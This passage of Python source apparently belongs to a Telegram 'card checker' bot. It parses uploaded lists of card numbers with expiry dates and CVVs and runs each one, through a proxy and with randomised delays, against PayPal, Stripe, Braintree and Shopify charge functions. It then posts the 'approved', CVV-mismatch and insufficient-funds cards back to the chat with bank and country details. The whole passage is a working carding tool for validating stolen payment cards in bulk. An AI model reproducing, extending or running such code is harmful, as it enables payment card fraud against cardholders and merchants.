                    card_count = sum(1 for line in lines if line.strip() and '|' in line)
                
                if card_count == 0:
                    await update.message.reply_text(
                        "⚠️ <b>No cards found in file!</b>\n\n"
                        "File format should be:\n"
                        "<code>CARD_NUMBER|MM|YY|CVV</code>\n"
                        "One card per line.",
                        parse_mode='HTML'
                    )
                else:
                    # Queue the document for concurrent batch processing
                    queue_pos = queue_document(user_id, file_path, filename)
                    queued_count = len(get_queued_documents(user_id))
                    
                    await update.message.reply_text(
                        f"📁 <b>File Queued</b>\n\n"
                        f"<code>{filename}</code>\n"
                        f"Cards: {card_count}\n"
                        f"Queue position: #{queue_pos}\n"
                        f"Total in queue: {queued_count}\n\n"
                        f"<b>Commands:</b>\n"
                        f"• <code>/massall</code> - Process all queued files\n"
                        f"• <code>/queue</code> - View queue status\n"
                        f"• <code>/mass</code> - Process this file only",
                        parse_mode='HTML'
                    )
            except Exception as e:
                await update.message.reply_text(f"❌ Error reading file: {str(e)}")
                # Clean up on error
                try:
                    os.remove(file_path)
                except OSError as e:
                    pass
        except Exception as e:
            await update.message.reply_text(f"❌ Error uploading file: {str(e)}")

async def mass_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check all cards from replied-to document or last uploaded file - works in private and group chats"""
    
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    chat_type = update.message.chat.type
    file_obj = None
    filename = None
    file_path = None
    
    print(f"\n[DEBUG-MASS] ===== /mass COMMAND START =====")
    print(f"[DEBUG-MASS] User {user_id}, Chat {chat_id} ({chat_type})")
    print(f"[DEBUG-MASS] Has reply_to_message: {update.message.reply_to_message is not None}")
    
    # Method 1: Check if this is a reply to a document (works in both private and group)
    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        print(f"[DEBUG-MASS] ✓ Found reply_to_message")
        print(f"[DEBUG-MASS]   - Has document: {replied_msg.document is not None}")
        
        if replied_msg.document:
            print(f"[DEBUG-MASS] ✓✓ DETECTED REPLY TO DOCUMENT - downloading...")
            file_obj = replied_msg.document
            filename = file_obj.file_name or f"cards_{file_obj.file_id}.txt"
            file = await file_obj.get_file()
            
            os.makedirs("uploaded_files", exist_ok=True)
            file_path = f"uploaded_files/user_{user_id}_{filename}"
            await file.download_to_drive(file_path)
            print(f"[DEBUG-MASS] ✓✓ Downloaded to: {file_path}")
            
            # Store for future use
            last_document[user_id] = {
                'path': file_path,
                'filename': filename,
                'file_obj': file_obj,
                'chat_id': chat_id,
                'message_id': replied_msg.message_id,
                'chat_type': chat_type
            }
            uploaded_files[user_id] = file_path
    
    # Method 2: Fallback to last uploaded document (works in both private and group)
    if not file_path and user_id in last_document:
        print(f"[DEBUG-MASS] ✓ Fallback to last_document[{user_id}]")
        file_path = last_document[user_id]['path']
        filename = last_document[user_id]['filename']
        print(f"[DEBUG-MASS]   File: {filename}")
    
    # Method 3: Fallback to uploaded_files (works in both private and group)
    if not file_path and user_id in uploaded_files:
        print(f"[DEBUG-MASS] ✓ Fallback to uploaded_files[{user_id}]")
        file_path = uploaded_files[user_id]
        filename = file_path.split('/')[-1]
    
    if not file_path:
        print(f"[DEBUG-MASS] ✗✗ NO FILE FOUND")
        print(f"[DEBUG-MASS] last_document.keys(): {list(last_document.keys())}")
        print(f"[DEBUG-MASS] uploaded_files.keys(): {list(uploaded_files.keys())}")
        await update.message.reply_text(
            "❌ <b>No document to check!</b>\n\n"
            "<b>Steps:</b>\n"
            "1️⃣ Upload a text file with cards\n"
            "2️⃣ Reply to the file with <code>/mass</code>\n\n"
            "<b>Card format:</b>\n"
            "<code>CARD_NUMBER|MM|YY|CVV</code>",
            parse_mode='HTML'
        )
        return
    
    # Verify file exists
    if not file_path or not os.path.exists(file_path):
        await update.message.reply_text("❌ File not found! Please upload a new file.")
        if user_id in last_document:
            del last_document[user_id]
        if user_id in uploaded_files:
            del uploaded_files[user_id]
        return
    
    print(f"[DEBUG] Processing file: {file_path}")
    
    # Read and parse cards
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                
                parts = line.split('|')
                if len(parts) == 4:
                    # Validate card format
                    card_num = parts[0].strip()
                    if card_num.isdigit() and len(card_num) >= 13:
                        year_val = parts[2].strip()
                        card_yer_val = f"20{year_val.zfill(2)}" if len(year_val) <= 2 else year_val[-4:]
                        cards.append({
                            'num': card_num,
                            'mon': parts[1].strip(),
                            'yer': card_yer_val,
                            'cvc': parts[3].strip()
                        })
    except Exception as e:
        print(f"[DEBUG] Error reading file: {e}")
        await update.message.reply_text(f"❌ Error reading file: {str(e)}")
        return
    
    print(f"[DEBUG] Found {len(cards)} valid cards")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found in file!\n\nFormat: CARD|MM|YY|CVV (one per line)")
        return
    
    # Send mass check start message with new formatter
    start_msg = format_start_batch(
        gateway_name="PayPal Multi-Check",
        total=len(cards),
        proxy_alive=proxy_status["live"]
    )
    status_msg = await update.message.reply_text(start_msg, parse_mode='HTML')
    
    # Store this check as ongoing (use check number system)
    check_num = get_next_check_number(user_id)
    register_check(user_id, check_num)
    
    approved_cards = []
    cvv_mismatch_cards = []
    insufficient_cards = []
    failed_cards = []
    check_start_time = time.time()
    
    # Check each card
    for idx, card in enumerate(cards, 1):
        # Check if stop was requested
        if should_stop(user_id, check_num):
            print(f"[DEBUG] Stop requested by user {user_id} for check #{check_num}")
            await status_msg.reply_text(
                f"⏹️ <b>Mass check #{check_num} stopped!</b>\n\n"
                f"Progress: {idx-1}/{len(cards)} cards checked",
                parse_mode='HTML'
            )
            break
        
        try:
            # Update progress every 10 cards with new formatter
            if idx % 10 == 0:
                progress_msg = format_progress(idx, len(cards))
                try:
                    await status_msg.reply_text(progress_msg, parse_mode='HTML')
                except (Exception,) as e:
                    pass
            
            # Check the card with timing
            card_start = time.time()
            result, _ = check_card(card['num'], card['mon'], card['yer'], card['cvc'])
            card_elapsed = round(time.time() - card_start, 2)
            
            print(f"[DEBUG] Card {idx}: {card['num'][:6]}... - Result: {result}")
            
            # Determine card status
            card_status = ApprovalStatus.DECLINED
            if result and "Error" not in result:
                if any(keyword in result.lower() for keyword in ["charged", "approved", "success", "accesstoken", "cartid"]):
                    card_status = ApprovalStatus.APPROVED
                elif "cvv" in result.lower():
                    card_status = ApprovalStatus.CVV_ISSUE
                elif "insufficient" in result.lower():
                    card_status = ApprovalStatus.INSUFFICIENT_FUNDS
            
            card_full = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
            
            # Show approved/CVV/insufficient cards, suppress declined
            if card_status == ApprovalStatus.APPROVED:
                approved_cards.append(card_full)
                bank_name, country = lookup_bin_info(card['num'])
                
                # Use new formatter for approved card
                approved_msg = format_batch_hit(
                    card_input=card_full,
                    card_brand=get_card_brand(card['num']),
                    card_type=get_card_type_from_bin(card['num']),
                    country=country,
                    bank_name=bank_name,
                    gateway="PayPal",
                    amount="$20.00 USD",
                    elapsed_sec=card_elapsed,
                    current=len(approved_cards),
                    total=len(cards)
                )
                try:
                    await update.message.reply_text(approved_msg, parse_mode='HTML')
                except Exception as e:
                    print(f"[DEBUG] Error posting approved card: {e}")
            
            elif card_status == ApprovalStatus.CVV_ISSUE:
                cvv_mismatch_cards.append(card_full)
                bank_name, country = lookup_bin_info(card['num'])
                
                approved_msg = format_batch_hit(
                    card_input=card_full,
                    card_brand=get_card_brand(card['num']),
                    card_type=get_card_type_from_bin(card['num']),
                    country=country,
                    bank_name=bank_name,
                    gateway="PayPal",
                    amount="CVV Mismatch",
                    elapsed_sec=card_elapsed,
                    current=len(cvv_mismatch_cards),
                    total=len(cards)
                )
                try:
                    await update.message.reply_text(approved_msg, parse_mode='HTML')
                except Exception as e:
                    print(f"[DEBUG] Error posting CVV card: {e}")
            
            elif card_status == ApprovalStatus.INSUFFICIENT_FUNDS:
                insufficient_cards.append(card_full)
                bank_name, country = lookup_bin_info(card['num'])
                
                approved_msg = format_batch_hit(
                    card_input=card_full,
                    card_brand=get_card_brand(card['num']),
                    card_type=get_card_type_from_bin(card['num']),
                    country=country,
                    bank_name=bank_name,
                    gateway="PayPal",
                    amount="Insufficient Funds",
                    elapsed_sec=card_elapsed,
                    current=len(insufficient_cards),
                    total=len(cards)
                )
                try:
                    await update.message.reply_text(approved_msg, parse_mode='HTML')
                except Exception as e:
                    print(f"[DEBUG] Error posting insufficient funds card: {e}")
            else:
                # Suppress declined cards
                failed_cards.append(card_full)
            
            # Add delay between requests (non-blocking)
            await asyncio.sleep(random.randint(5, 10))
            
        except Exception as e:
            card_full = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
            failed_cards.append(card_full)
            await asyncio.sleep(random.randint(2, 5))
    
    # Send final summary with new formatter
    total_check_time = round(time.time() - check_start_time, 2)
    summary_msg = format_batch_complete(
        gateway_name="PayPal",
        total=len(cards),
        approved=len(approved_cards),
        declined=len(failed_cards),
        cvv=len(cvv_mismatch_cards),
        three_ds=0,
        nsf=len(insufficient_cards),
        elapsed_sec=total_check_time,
        was_stopped=False
    )
    
    try:
        await status_msg.reply_text(summary_msg, parse_mode='HTML')
    except Exception as e:
        print(f"[DEBUG] Error sending summary: {e}")
    
    # Clean up
    try:
        os.remove(file_path)
    except OSError as e:
        pass
    
    # Clear stored document
    if user_id in last_document:
        del last_document[user_id]
    if user_id in uploaded_files:
        del uploaded_files[user_id]
    
    # Clear ongoing check (use check number system)
    unregister_check(user_id, check_num)

async def stop_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop a specific mass check by number (e.g., /stop1, /stop2)"""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    
    # Parse check number from command
    # /stop (bare) = show active checks
    # /stopN = stop check number N
    if text == "/stop":
        # Show all active checks
        if user_id not in ongoing_checks or not ongoing_checks[user_id]:
            await update.message.reply_text(
                "❌ <b>No active checks!</b>\n\n"
                "Use <code>/mass</code> or a gateway command to start a mass check.",
                parse_mode='HTML'
            )
            return
        
        active_checks = list(ongoing_checks[user_id].keys())
        msg = f"<b>🔢 Active Mass Checks:</b>\n\n"
        for num in sorted(active_checks):
            msg += f"• <code>/stop{num}</code> - Mass Check #{num}\n"
        msg += f"\n<b>Total:</b> {len(active_checks)} active"
        await update.message.reply_text(msg, parse_mode='HTML')
        return
    
    # Extract number from /stopN
    num_part = text[5:]  # Everything after "/stop"
    if not num_part.isdigit():
        await update.message.reply_text(
            "❌ <b>Invalid command!</b>\n\n"
            "Use <code>/stop</code> to see active checks\n"
            "Or <code>/stop1</code>, <code>/stop2</code>, etc. to stop a specific check.",
            parse_mode='HTML'
        )
        return
    
    check_num = int(num_part)
    
    # Check if this check exists
    if not is_check_active(user_id, check_num):
        await update.message.reply_text(
            f"❌ <b>No active check #{check_num}!</b>\n\n"
            "Use <code>/stop</code> to see all active checks.",
            parse_mode='HTML'
        )
        return
    
    # Request stop for this specific check
    request_stop(user_id, check_num)
    await update.message.reply_text(
        f"⏹️ <b>Stopping Mass Check #{check_num}...</b>\n\n"
        "The check will be cancelled after the current card is processed.",
        parse_mode='HTML'
    )


# Phase 11.3: Refactored stripe_command to use factory
stripe_command = create_single_gateway_handler(
    gateway_fn=stripe_check,
    gateway_name="Stripe",
    amount=1.00,
    timeout=30
)


async def mass_with_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_fn, gateway_name: str):
    """Generic runner to process a mass file using a provided gateway function.
    
    IMPORTANT: This spawns a background task so the bot remains responsive during batch operations.
    The handler returns immediately after starting the batch, allowing other commands to be processed.
    """
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    
    async def run_mass_check_background():
        """Background task wrapper for mass check"""
        async with file_check_semaphore:
            try:
                await _mass_with_gateway_impl(update, context, gateway_fn, gateway_name, user_id, chat_id)
            except Exception as e:
                print(f"[ERROR] Mass check background task failed: {e}")
                try:
                    await update.message.reply_text(f"❌ Mass check failed: {str(e)[:100]}")
                except:
                    pass
    
    context.application.create_task(run_mass_check_background())

async def _mass_with_gateway_impl(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_fn, gateway_name: str, user_id: int, chat_id: int):
    """Implementation of mass gateway check (runs inside file_check_semaphore)."""
    
    # Get unique check number for this mass check
    check_num = get_next_check_number(user_id)
    register_check(user_id, check_num)

    # Determine file path
    file_path = None
    filename = None
    if update.message.reply_to_message and update.message.reply_to_message.document:
        replied_msg = update.message.reply_to_message
        file_obj = replied_msg.document
        filename = file_obj.file_name or f"cards_{file_obj.file_id}.txt"
        file = await file_obj.get_file()
        os.makedirs("uploaded_files", exist_ok=True)
        file_path = f"uploaded_files/user_{user_id}_{filename}"
        await file.download_to_drive(file_path)
        last_document[user_id] = {'path': file_path, 'filename': filename, 'file_obj': file_obj, 'chat_id': chat_id, 'message_id': replied_msg.message_id, 'chat_type': update.message.chat.type}
        uploaded_files[user_id] = file_path

    if not file_path and user_id in last_document:
        file_path = last_document[user_id]['path']
        filename = last_document[user_id]['filename']
    if not file_path and user_id in uploaded_files:
        file_path = uploaded_files[user_id]
        filename = file_path.split('/')[-1]

    if not file_path or not os.path.exists(file_path):
        unregister_check(user_id, check_num)
        await update.message.reply_text("❌ No document to check or file missing. Upload a file and reply with this command.")
        return

    # Read cards
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                parts = line.split('|')
                if len(parts) == 4:
                    card_num = parts[0].strip()
                    if card_num.isdigit() and len(card_num) >= 13:
                        year_val = parts[2].strip()
                        card_yer_val = f"20{year_val.zfill(2)}" if len(year_val) <= 2 else year_val[-4:]
                        cards.append({'num': card_num, 'mon': parts[1].strip(), 'yer': card_yer_val, 'cvc': parts[3].strip()})
    except Exception as e:
        unregister_check(user_id, check_num)
        await update.message.reply_text(f"❌ Error reading file: {e}")
        return

    if not cards:
        unregister_check(user_id, check_num)
        await update.message.reply_text("❌ No valid cards found in file!")
        return

    status_msg = await update.message.reply_text(
        f"<b>🚀 Mass Check #{check_num} Started</b>\n\n"
        f"<b>Gateway:</b> {gateway_name}\n"
        f"<b>File:</b> {filename}\n"
        f"<b>Total Cards:</b> {len(cards)}\n"
        f"<b>Stop Command:</b> <code>/stop{check_num}</code>",
        parse_mode='HTML'
    )

    # Check proxy health before starting mass checks
    proxy_healthy = await asyncio.to_thread(validate_proxy_before_request)
    if not proxy_healthy:
        await status_msg.reply_text("⚠️ Warning: Proxy is not responding. Continuing anyway...", parse_mode='HTML')

    # Store status message for this specific check (enables concurrent mass checks)
    check_status[f"{user_id}_{check_num}"] = status_msg
    
    # NEW: Track stats for this specific file check
    check_key = f"{user_id}_{check_num}"
    concurrent_file_stats[check_key] = {
        "approved": 0,
        "failed": 0,
        "status_msg": status_msg,
        "cards_processed": 0,
        "gateway": gateway_name
    }
    
    # Create unique session_id for batch control buttons
    session_id = str(uuid.uuid4())[:8]
    batch_sessions[session_id] = {
        "paused": False,
        "stopped": False,
        "user_id": user_id,
        "check_num": check_num,
        "chat_id": chat_id
    }

    approved = []
    failed = []
    approved_count_for_progress = 0
    cvv_count = 0
    nsf_count = 0
    three_ds_count = 0
    batch_start_time = time.time()
    
    async def check_card_with_limit(idx, card):
        """Process a single card with semaphore concurrency limit (Issue 2)"""
        nonlocal approved_count_for_progress, cvv_count, nsf_count, three_ds_count
        async with mass_check_semaphore:
            # Check if stop was requested for this specific check
            if should_stop(user_id, check_num):
                return None  # Signal to stop
            
            # Check batch session stop/pause state
            if batch_sessions.get(session_id, {}).get("stopped"):
                return None  # Signal to stop
            
            # Wait while paused
            while batch_sessions.get(session_id, {}).get("paused"):
                await asyncio.sleep(0.5)
            
            # Time the gateway call
            start_time = time.time()
            res, proxy_ok = await call_gateway_with_timeout(gateway_fn, card['num'], card['mon'], card['yer'], card['cvc'], timeout=22, proxy=PROXY)
            elapsed_ms = int((time.time() - start_time) * 1000)
            
            # Use response formatter to determine approval status
            status = ApprovalStatus.DECLINED
            if res and "Error" not in res:
                res_lower = res.lower()
                if any(keyword in res_lower for keyword in ["charged", "approved", "success", "accesstoken", "cartid"]):
                    status = ApprovalStatus.APPROVED
                elif "cvv" in res_lower:
                    status = ApprovalStatus.CVV_ISSUE
                    cvv_count += 1
                elif "insufficient" in res_lower:
                    status = ApprovalStatus.INSUFFICIENT_FUNDS
                    nsf_count += 1
                elif "3ds" in res_lower or "authentication" in res_lower or "3d secure" in res_lower:
                    three_ds_count += 1
            
            is_approved = status == ApprovalStatus.APPROVED
            
            # Record metrics
            record_metric(gateway_name, card['num'][:6], status.value, elapsed_ms, user_id=user_id)
            
            card_full = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
            if is_approved or status in [ApprovalStatus.CVV_ISSUE, ApprovalStatus.INSUFFICIENT_FUNDS]:
                approved.append(card_full)
                approved_count_for_progress += 1
                
                # Post individual approved card with full details (auto-caching handled by formatter)
                bank_name, country = lookup_bin_info(card['num'])
                elapsed_sec = elapsed_ms / 1000
                
                formatted_response = await format_and_cache_response(
                    gateway_name=gateway_name,
                    card_input=card_full,
                    status=status,
                    message=res,
                    elapsed_sec=elapsed_sec,
                    security_type=detect_security_type(res),
                    vbv_status="Successful" if status == ApprovalStatus.APPROVED else "Unknown",
                    proxy_alive=proxy_ok,
                    bank_name=bank_name,
                    country=country,
                    amount_usd=get_gateway_amount(gateway_name.lower().replace(' ', '_'))
                )
                try:
                    await status_msg.reply_text(formatted_response, parse_mode='HTML')
                    print(f"[DEBUG] Posted approved card: {card['num'][:6]}***")
                except Exception as e:
                    print(f"[ERROR] Failed to post approved card: {e}")
            else:
                failed.append(card_full)
            
            # Small delay between cards
            await asyncio.sleep(random.randint(3, 6))
            return idx
    
    # Process all cards with concurrency control
    tasks = [check_card_with_limit(idx, card) for idx, card in enumerate(cards, 1)]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    
    # Check if any check was stopped
    if None in results:
        stop_msg = f"""⏹️ <b>Mass Check #{check_num} Stopped</b>

<b>Status:</b> Cancellation requested by user
<b>Gateway:</b> {gateway_name}
<b>Progress:</b> {len([r for r in results if r is not None])}/{len(cards)} cards processed
<b>File:</b> {filename}

<i>Check stopped gracefully. No data was lost.</i>"""
        await status_msg.reply_text(stop_msg, parse_mode='HTML')
    else:
        # Create compact batch summary using new formatter with real stats
        total_elapsed = round(time.time() - batch_start_time, 2)
        rich_summary = format_batch_complete(
            gateway_name=gateway_name,
            total=len(cards),
            approved=approved_count_for_progress,
            declined=len(failed),
            cvv=cvv_count,
            three_ds=three_ds_count,
            nsf=nsf_count,
            elapsed_sec=total_elapsed,
            was_stopped=False
        )
        
        # Add approved cards list
        if approved:
            rich_summary += "\n\n<b>💳 Approved Cards:</b>\n"
            for idx, card in enumerate(approved[:15], 1):
                rich_summary += f"{idx}. <code>{card}</code>\n"
            if len(approved) > 15:
                rich_summary += f"<i>... and {len(approved) - 15} more</i>\n"
        
        try:
            await status_msg.edit_text(rich_summary, parse_mode='HTML')
        except (Exception,) as e:
            pass
    
    # Unregister the check when done
    unregister_check(user_id, check_num)
    
    # Clean up batch session
    if session_id in batch_sessions:
        del batch_sessions[session_id]


async def multigate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """NEW: Check a file across multiple gates simultaneously
    Usage: /multigate stripe,paypal,shopify
    or just: /multigate (uses default gateways: stripe, paypal, shopify)
    """
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    
    # Default gateways if none specified
    default_gateways = {
        'stripe': stripe_check,
        'paypal': paypal_charge_check,
        'shopify': shopify_nano_check
    }
    
    # Get gateways from args or use default
    requested_gates = []
    if context.args:
        gate_names = context.args[0].split(',')
        for gate in gate_names:
            gate = gate.strip().lower()
            if gate in default_gateways:
                requested_gates.append((gate, default_gateways[gate]))
    
    if not requested_gates:
        requested_gates = list(default_gateways.items())
    
    # Get file path
    file_path = None
    filename = None
    if update.message.reply_to_message and update.message.reply_to_message.document:
        file_obj = update.message.reply_to_message.document
        filename = file_obj.file_name or f"cards_{file_obj.file_id}.txt"
        file = await file_obj.get_file()
        os.makedirs("uploaded_files", exist_ok=True)
        file_path = f"uploaded_files/user_{user_id}_{filename}"
        await file.download_to_drive(file_path)
        last_document[user_id] = {'path': file_path, 'filename': filename}
        uploaded_files[user_id] = file_path
    
    if not file_path and user_id in last_document:
        file_path = last_document[user_id]['path']
        filename = last_document[user_id]['filename']
    
    if not file_path or not os.path.exists(file_path):
        await update.message.reply_text("❌ No file found! Upload a file and try again.")
        return
    
    # Read cards
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                parts = line.split('|')
                if len(parts) == 4:
                    card_num = parts[0].strip()
                    if card_num.isdigit() and len(card_num) >= 13:
                        year_val = parts[2].strip()
                        card_yer_val = f"20{year_val.zfill(2)}" if len(year_val) <= 2 else year_val[-4:]
                        cards.append({'num': card_num, 'mon': parts[1].strip(), 'yer': card_yer_val, 'cvc': parts[3].strip()})
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {e}")
        return
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found!")
        return
    
    # Start multigate check
    gate_names_str = ", ".join([g[0].title() for g in requested_gates])
    start_msg = await update.message.reply_text(
        f"<b>🚀 Multi-Gate Check Started</b>\n\n"
        f"<b>Gateways:</b> {gate_names_str}\n"
        f"<b>File:</b> {filename}\n"
        f"<b>Total Cards:</b> {len(cards)}\n"
        f"<b>Status:</b> Processing across {len(requested_gates)} gates...",
        parse_mode='HTML'
    )
    
    # Run all gateways concurrently using asyncio.gather
    async def check_file_on_gate(gateway_name, gateway_fn):
        """Check all cards on a single gateway"""
        results = {
            'gateway': gateway_name,
            'approved': [],
            'failed': [],
            'total': len(cards),
            'approved_count': 0
        }
        
        for idx, card in enumerate(cards, 1):
            try:
                async with file_check_semaphore:
                    start_time = time.time()
                    res, _ = await call_gateway_with_timeout(
                        gateway_fn,
                        card['num'], card['mon'], card['yer'], card['cvc'],
                        timeout=22,
                        proxy=PROXY
                    )
                    elapsed_ms = int((time.time() - start_time) * 1000)
                    
                    # Determine status
                    status = ApprovalStatus.DECLINED
                    if res and "Error" not in res:
                        if any(k in res.lower() for k in ["charged", "approved", "success", "accesstoken", "cartid"]):
                            status = ApprovalStatus.APPROVED
                        elif "cvv" in res.lower():
                            status = ApprovalStatus.CVV_ISSUE
                        elif "insufficient" in res.lower():
                            status = ApprovalStatus.INSUFFICIENT_FUNDS
                    
                    card_full = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
                    
                    if status == ApprovalStatus.APPROVED or status in [ApprovalStatus.CVV_ISSUE, ApprovalStatus.INSUFFICIENT_FUNDS]:
                        results['approved'].append(card_full)
                        results['approved_count'] += 1
                        # Send approved card notification
                        try:
                            bank_name, country = lookup_bin_info(card['num'])
                            msg = format_batch_hit(
                                card_input=card_full,
                                card_brand=get_card_brand(card['num']),
                                card_type=get_card_type_from_bin(card['num']),
                                country=country,
                                bank_name=bank_name,
                                gateway=gateway_name,
                                amount="$0.01 USD",
                                elapsed_sec=elapsed_ms/1000,
                                current=idx,
                                total=len(cards)
                            )
                            await update.message.reply_text(msg, parse_mode='HTML')
                        except Exception:
                            pass
                    else:
                        results['failed'].append(card_full)
                    
                    await asyncio.sleep(random.randint(5, 10))
            except Exception as e:
                results['failed'].append(f"{card['num']}|error")
                await asyncio.sleep(2)
        
        return results
    
    # Run all gateways in parallel
    gate_tasks = [check_file_on_gate(name, fn) for name, fn in requested_gates]
    all_results = await asyncio.gather(*gate_tasks)
    
    # Send summary
    summary = "<b>✅ Multi-Gate Check Complete</b>\n\n"
    total_approved = 0
    total_failed = 0
    
    for result in all_results:
        total_approved += result['approved_count']
        total_failed += result['total'] - result['approved_count']
        summary += f"<b>{result['gateway'].title()}:</b> {result['approved_count']}/{result['total']} approved\n"
    
    summary += f"\n<b>Overall:</b> {total_approved}/{len(cards)} approved ({round(total_approved/len(cards)*100, 1)}%)"
    
    try:
        await start_msg.edit_text(summary, parse_mode='HTML')
    except Exception:
        await update.message.reply_text(summary, parse_mode='HTML')


# Phase 11.3: Refactored mass_stripe_command to use batch factory
mass_stripe_command = create_batch_gateway_handler(
    gateway_fn=stripe_check,
    gateway_name="Stripe",
    amount=1.00,
    max_batch=500
)


# ============================================================================
# PAIRED CHECK COMMANDS - Check single file across two gateways simultaneously
# ============================================================================

async def paired_paypal_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /paired_ps command - PayPal + Stripe (Paired Check)"""
    await mass_with_paired_gateways(
        update, context, 
        {'paypal': paypal_charge_check, 'stripe': stripe_check},
        "Paired Check: PayPal + Stripe"
    )

async def paired_braintree_paypal_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /paired_bp command - Braintree + PayPal (Paired Check)"""
    await mass_with_paired_gateways(
        update, context,
        {'braintree': braintree_check, 'paypal': paypal_charge_check},
        "Paired Check: Braintree + PayPal"
    )

async def paired_shopify_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /paired_ss command - Shopify + Stripe (Paired Check)"""
    await mass_with_paired_gateways(
        update, context,
        {'shopify': shopify_nano_check, 'stripe': stripe_check},
        "Paired Check: Shopify + Stripe"
    )

async def paired_braintree_stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /paired_bs command - Braintree + Stripe (Paired Check)"""
    await mass_with_paired_gateways(
        update, context,
        {'braintree': braintree_check, 'stripe': stripe_check},
        "Paired Check: Braintree + Stripe"
    )

async def mass_with_paired_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE, gateways_dict: dict, pair_name: str):
    """Process a single file across two gateways simultaneously (Paired Check tab).
    
    IMPORTANT: Spawns as background task so bot remains responsive during batch operations.
    """
    user_id = update.message.from_user.id
    
    async def run_paired_check_background():
        """Background task for paired gateway check"""
        await _mass_with_paired_gateways_impl(update, context, gateways_dict, pair_name, user_id)
    
    context.application.create_task(run_paired_check_background())


async def _mass_with_paired_gateways_impl(update: Update, context: ContextTypes.DEFAULT_TYPE, gateways_dict: dict, pair_name: str, user_id: int):
    """Implementation of paired gateway check (runs as background task)."""
    
    # Get the file
    if update.message.document:
        file = await update.message.document.get_file()
    elif context.user_data.get('last_file'):
        file = context.user_data['last_file']
    else:
        await update.message.reply_text("❌ Please upload a file or use /last to reference previous file.", parse_mode='HTML')
        return
    
    # Download file content
    try:
        file_content = await file.download_as_bytearray()
        cards_text = file_content.decode('utf-8', errors='ignore').strip()
        cards_list = [c.strip() for c in cards_text.split('\n') if c.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)}", parse_mode='HTML')
        return
    
    if not cards_list:
        await update.message.reply_text("❌ File is empty or invalid format.", parse_mode='HTML')
        return
    
    # Parse cards
    cards = []
    for card_str in cards_list:
        parts = card_str.split('|')
        if len(parts) >= 4:
            cards.append({
                'num': parts[0].strip(),
                'mon': parts[1].strip(),
                'yer': parts[2].strip()[-2:],
                'cvc': parts[3].strip()
            })
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found in file.", parse_mode='HTML')
        return
    
    # Create initial status message
    filename = update.message.document.file_name if update.message.document else "uploaded_file.txt"
    status_msg = await update.message.reply_text(
        f"<b>🔄 Paired Check Starting</b>\n\n"
        f"<b>Pair:</b> {pair_name}\n"
        f"<b>File:</b> {filename}\n"
        f"<b>Cards:</b> {len(cards)}\n\n"
        f"<i>Processing...</i>",
        parse_mode='HTML'
    )
    
    # Run both gateways concurrently
    results = {}
    
    async def check_on_gateway(gate_name, gate_fn):
        """Check all cards on a single gateway"""
        approved = []
        failed = []
        approved_count = 0
        
        for idx, card in enumerate(cards, 1):
            try:
                res, proxy_ok = await call_gateway_with_timeout(
                    gate_fn, card['num'], card['mon'], card['yer'], card['cvc'], 
                    timeout=22, proxy=PROXY
                )
                
                # Determine if approved
                is_approved = False
                if res and "Error" not in res:
                    if any(kw in res.lower() for kw in ["charged", "approved", "success", "accesstoken", "cartid"]):
                        is_approved = True
                
                card_full = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
                if is_approved:
                    approved.append(card_full)
                    approved_count += 1
                else:
                    failed.append(card_full)
                
                await asyncio.sleep(random.randint(3, 6))
            except Exception as e:
                pass
        
        return {'approved': approved, 'failed': failed, 'count': approved_count}
    
    # Run both gateways concurrently
    gate_tasks = [
        check_on_gateway(name, fn) for name, fn in gateways_dict.items()
    ]
    gate_results = await asyncio.gather(*gate_tasks)
    results = {list(gateways_dict.keys())[i]: gate_results[i] for i in range(len(gate_results))}
    
    # Create final summary
    total_approved = sum(r['count'] for r in results.values())
    total_failed = len(cards) - total_approved
    approval_rate = round(total_approved/len(cards)*100, 1) if len(cards) > 0 else 0
    
    summary_lines = [
        "<b>✅ Paired Check Complete</b>\n",
        "<b>📋 Check Details:</b>",
        f"├─ Pair: {pair_name}",
        f"├─ File: {filename}",
        f"├─ Total Cards: {len(cards)}",
        f"└─ Overall Approval Rate: <b>{approval_rate}%</b>\n",
        "<b>📊 Per-Gateway Results:</b>"
    ]
    
    for gate_name, data in results.items():
        gate_approval_rate = round(data['count']/len(cards)*100, 1) if len(cards) > 0 else 0
        summary_lines.append(f"<b>{gate_name.capitalize()}:</b>")
        summary_lines.append(f"  ├─ ✅ Approved: {data['count']} ({gate_approval_rate}%)")
        summary_lines.append(f"  └─ ❌ Declined: {len(data['failed'])} ({round(len(data['failed'])/len(cards)*100, 1)}%)")
    
    summary_lines.append(f"\n<b>🎯 Combined Results:</b>")
    summary_lines.append(f"├─ ✅ Total Approved: <b>{total_approved}</b>")
